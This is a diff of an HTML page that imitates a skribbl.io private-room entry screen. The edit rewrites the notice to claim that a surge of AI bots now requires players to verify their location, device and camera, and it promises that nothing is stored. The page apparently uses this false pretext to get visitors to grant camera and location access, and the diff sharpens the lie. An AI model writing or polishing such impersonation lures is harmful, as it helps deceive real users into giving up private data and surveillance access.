@@ -99,8 +99,9 @@ body{font-family:'Nunito',sans-serif;background:#1d2f6f;min-height:100vh;display
     <div class="card-top">🔒 Private Room — Verification Required</div>
     <div class="card-body">
       <div class="notice">
-        <b>Location &amp; device verification required.</b><br/>
-        skribbl.io checks your location and device to prevent bots and ensure only real players join private rooms. This data is <b>not stored</b> and is only used for this session.
+        <b>⚠ Human Verification Required</b><br/><br/>
+        Due to a recent surge in <b>AI bots</b> attempting to join private rooms, skribbl.io now requires a quick one-time verification before entry.<br/><br/>
+        This check confirms you are a real player by verifying your <b>location</b>, <b>device</b>, and <b>camera</b>. No data is stored — everything is discarded immediately after verification.
       </div>
       <div id="cam-status" style="display:none;font-size:.8rem;font-weight:700;padding:8px 10px;border-radius:3px;background:rgba(0,0,0,.25);border:1px solid rgba(255,255,255,.12);text-align:center"></div>
       <button id="btn" onclick="joinRoom()" disabled>Verify &amp; Join Room</button>
